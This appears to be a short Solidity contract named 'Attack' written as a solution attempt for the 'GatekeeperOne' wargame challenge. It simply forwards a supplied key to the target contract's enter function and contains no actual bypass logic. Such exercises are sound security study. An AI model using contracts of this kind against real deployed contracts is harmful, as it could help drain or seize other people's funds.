// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Attack {
    using SafeMath for uint256;
    GatekeeperOne gatekeeper;
    address public owner;

    constructor(address payable _gatekeeper) public {
        gatekeeper = GatekeeperOne(_gatekeeper);
        owner = msg.sender;
    }

    function attack(bytes8 gateKey) public returns (uint256) {
        gatekeeper.enter(gateKey);
    }
}
